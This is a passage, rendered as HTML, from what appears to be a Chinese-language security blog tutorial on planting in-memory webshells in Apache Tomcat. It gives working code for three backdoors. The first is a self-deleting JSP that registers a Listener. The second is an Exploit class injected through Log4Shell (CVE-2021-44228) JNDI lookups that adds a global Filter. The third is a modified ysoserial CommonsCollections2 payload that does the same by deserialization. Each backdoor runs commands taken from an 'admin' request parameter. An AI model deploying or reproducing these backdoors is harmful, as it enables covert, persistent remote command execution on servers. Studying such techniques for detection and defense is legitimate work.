class="line">%&gt;</span><br></pre></td></tr></table></figure><p>触发方法：将JSP放入<code>webapp</code>文件夹中，我们首先访问路径<code>/addFilter.jsp</code>写入内存马，然后在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p><h3 id="增加Listener"><a href="#增加Listener" class="headerlink" title="增加Listener"></a>增加Listener</h3><p>Tomcat的Listener可以用于在某个事件发生时执行操作，我们选择实现<code>ServletRequestListener</code>来监听每一个HTTP请求</p><p>增加Listener的方式分为2个步骤</p><ol><li>利用反射通过<code>ApplicationContextFacade</code>获取到<code>StandardContext</code></li><li>将<code>Listener</code>添加到<code>StandardContext</code>中</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BackdoorListener</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反射从ApplicationContextFacade中获取到当前的StandardContext</span></span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field field = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);</span><br><span class="line">    field = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) field.get(applicationContext);</span><br><span class="line">    standardContext.addApplicationEventListener(<span class="keyword">new</span> BackdoorListener());</span><br><span class="line">    <span class="comment">// 自毁</span></span><br><span class="line">    (<span class="keyword">new</span> File(application.getRealPath(request.getServletPath()))).delete();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>触发方法：将JSP放入<code>webapp</code>文件夹中，我们首先访问路径<code>/addListener.jsp</code>写入内存马，然后在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p><p>介绍完Tomcat JSP内存马，接下来我们进入真正无文件落地的基于JNDI和反序列化植入内存马</p><h2 id="基于JNDI的内存马植入-以CVE-2021-44228-Log4Shell为例"><a href="#基于JNDI的内存马植入-以CVE-2021-44228-Log4Shell为例" class="headerlink" title="基于JNDI的内存马植入 - 以CVE-2021-44228 Log4Shell为例"></a>基于JNDI的内存马植入 - 以CVE-2021-44228 Log4Shell为例</h2><blockquote><p>关于CVE-2021-44228的分析，可以参见我之前的<a href="/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/">讲解文章</a>，由于我使用remote codebase方法，本节只能使用jdk 8u181及以下的版本</p></blockquote><h3 id="准备Tomcat脆弱环境"><a href="#准备Tomcat脆弱环境" class="headerlink" title="准备Tomcat脆弱环境"></a>准备Tomcat脆弱环境</h3><p>首先在Tomcat项目的<code>pom.xml</code>中加入log4j-core 2.14.1的依赖，然后我们再写一个触发log4j漏洞的Servlet</p><blockquote><p>直接在自动创建的HelloServlet上修改即可</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.JavaWebDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        message = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Logger logger = LogManager.getLogger();</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="string">&quot;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="构造Exploit"><a href="#构造Exploit" class="headerlink" title="构造Exploit"></a>构造Exploit</h3><p>我们只尝试增加Filter，增加Servlet和Listener的方法也比较相似，不重复讨论</p><p>接下来按照我之前的CVE-2021-44228分析中的方法触发JNDI漏洞，我们将反弹Shell的代码进行修改</p><p>这时候遇到一个难点，之前我们使用JSP获取内存马，可以发现，往Tomcat中注入内存马的核心是需要获取到StandardContext实例，之前JSP会自动放进去一个request对象，可以用于获取StandardContext，但是此时没有这个便捷的方式，所以我们要另寻出入了</p><p>参考这篇文章：<a href="https://xz.aliyun.com/t/9914">Java内存马：一种Tomcat全版本获取StandardContext的新方法 - 先知社区 (aliyun.com)</a></p><p>由于我们使用Tomcat9，此处我们使用”从ContextClassLoader获取”的方式为例来获取<code>StandardContext</code>，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br></pre></td></tr></table></figure><p>整合Exploit，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">BackdoorFilter</span> <span class="keyword">extends</span> <span class="title">HttpFilter</span> </span>&#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">                <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(req, res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String name = <span class="string">&quot;BackdoorFilter&quot;</span>;</span><br><span class="line">        <span class="comment">// 从ContextClassLoader获取StandardContext</span></span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="comment">// 通过反射从StandardContext获取到filterConfigs</span></span><br><span class="line">        Field field = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map filterConfigs = (Map) field.get(standardContext);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>) &#123; <span class="comment">// 防止重复注入</span></span><br><span class="line">            BackdoorFilter filter = <span class="keyword">new</span> BackdoorFilter();</span><br><span class="line">            <span class="comment">// 封装Filter为FilterDef，并添加到StandContext中</span></span><br><span class="line">            FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">            filterDef.setFilterName(name);</span><br><span class="line">            filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">            filterDef.setFilter(filter);</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line">            <span class="comment">// 生成新的ApplicationFilterConfig并添加到filterConfigs中</span></span><br><span class="line">            Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">            filterConfigs.put(name, filterConfig);</span><br><span class="line">            <span class="comment">// 创建FilterMap并加入StandardContext中，为Filter确定适用的URL</span></span><br><span class="line">            FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 全局生效</span></span><br><span class="line">            filterMap.setFilterName(name);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先触发log4j漏洞，利用JNDI执行我们的Exploit植入内存马，随后访问任意URL时带上admin参数即可执行命令</p><p>可以发现，在这种情况下，我们实现了真正的<strong>无文件落地</strong>，但是JNDI+LDAP的攻击方式在jdk 8u191及之后就无法利用了，下一节我们讨论基于反序列化的植入方法</p><h2 id="基于反序列化的内存马植入-ysoserial-CommonsCollections2改造"><a href="#基于反序列化的内存马植入-ysoserial-CommonsCollections2改造" class="headerlink" title="基于反序列化的内存马植入 - ysoserial-CommonsCollections2改造"></a>基于反序列化的内存马植入 - ysoserial-CommonsCollections2改造</h2><blockquote><p>参考：<a href="https://xz.aliyun.com/t/7388">基于tomcat的内存 Webshell 无文件攻击技术 - 先知社区 (aliyun.com)</a></p></blockquote><p>由于CommonsCollections2使用了TemplatesImpl，所以我们才能用这个方法进行内存马注入，像CommonsCollections1没有利用TemplatesImpl，所以就不行了</p><h3 id="配置反序列化环境"><a href="#配置反序列化环境" class="headerlink" title="配置反序列化环境"></a>配置反序列化环境</h3><p>我们写一个进行反序列化的接口，放在<code>doPost()</code>里面，核心代码只需一句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> ObjectInputStream((request.getInputStream()))).readObject();</span><br></pre></td></tr></table></figure><p>我们使用CommonsCollections2作为例子，通过Maven引入<code>commons-collections4:4.0</code></p><p>测试一下环境是否正常</p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194726803.png" alt="image-20220126194726803"></p><p>会报错，但是我们可以发现是<code>TemplatesImpl</code>抛出的，并且检查命令执行效果可以发现命令执行成功了，接下来开始改造Payload</p><h3 id="构造Exploit-1"><a href="#构造Exploit-1" class="headerlink" title="构造Exploit"></a>构造Exploit</h3><p>首先是用IDEA导入ysoserial项目，项目的Jdk版本设置为1.8。</p><p>由于打包起来太麻烦，我们将<code>ysoserial.GeneratePayload</code>作为主类运行，直接生成Payload</p><p>由于我们要输出到文件中，修改<code>GeneraterPayload.java</code>的第35行<code>PrintStream out = System.out;</code>改为<code>PrintStream out = new PrintStream(&quot;./output.serial&quot;);</code></p><p>首先在<code>ysoserial.payloads.util.Gadgets.java</code>中调整<code>createTemplateImpl</code>函数</p><p>由于原版的<code>createTemplateImpl</code>根据要执行的指令来生成<code>TemplateImpl</code>我们将其重载并稍微修改一下    </p><p>我们复制<code>createTemplateImpl</code>并改为如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> Class _class )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            _class,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(_class, TemplatesImpl.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> Class _class, Class&lt;T&gt; tplClass, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = ClassFiles.classAsBytes(_class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于第一处重载，只是把<code>command</code>改为了<code>_class</code>并删除了无用的参数，第二处重载则从通过Javaassist技术制作类并获取字节码变为直接获取字节码，因为我们直接编写了类文件</p><p>然后将<code>payloads/CommonsCollections2</code>复制出一个新版本，命名为<code>CommonsCollections2ForClassInjection</code></p><p>将<code>command</code>参数重构为<code>payloadName</code>，变为注入的类名来使用，之后可以方便调整为使用<code>ServletInjection</code>等其它内存马</p><p>把这一句进行修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure><p>换为如下，直接通过类名获取字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(Class.forName(<span class="string">&quot;ysoserial.shells.&quot;</span>+payloadName));</span><br></pre></td></tr></table></figure><p>启动参数配置如下</p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194823501.png" alt="image-20220126194823501"></p><p>将生成的<code>output.serial</code>文件打到服务器上，然后在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p><p>可以发现我给自己起的Payload名字是<code>TomcatFilterInjection</code>，把它放在如图的位置</p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194842825.png" alt="image-20220126194842825"></p><p>Payload代码如下，大家也可以自己制作<code>ServletInjection</code>或者<code>ListenerInjection</code>作为Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.shells;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatFilterInjection</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            String name = <span class="string">&quot;TomcatFilterInjection&quot;</span>;</span><br><span class="line">            <span class="comment">// 从ContextClassLoader获取StandardContext</span></span><br><span class="line">            WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            <span class="comment">// 通过反射从StandardContext获取到filterConfigs</span></span><br><span class="line">            Field field = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map filterConfigs = (Map) field.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>) &#123; <span class="comment">// 防止重复注入</span></span><br><span class="line">                TomcatFilterInjection filter = <span class="keyword">new</span> TomcatFilterInjection();</span><br><span class="line">                <span class="comment">// 封装Filter为FilterDef，并添加到StandContext中</span></span><br><span class="line">                FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">                filterDef.setFilterName(name);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">// 生成新的ApplicationFilterConfig并添加到filterConfigs中</span></span><br><span class="line">                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">                constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">                filterConfigs.put(name, filterConfig);</span><br><span class="line">                <span class="comment">// 创建FilterMap并加入StandardContext中，为Filter确定适用的URL</span></span><br><span class="line">                FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 全局生效</span></span><br><span class="line">                filterMap.setFilterName(name);</span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 忽略错误，在生成生成序列化代码时也会执行static部分，必然报错，直接跳过即可</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse res,</span></span></span><br><span class="line"><span class="params"><span class="function">                         FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span 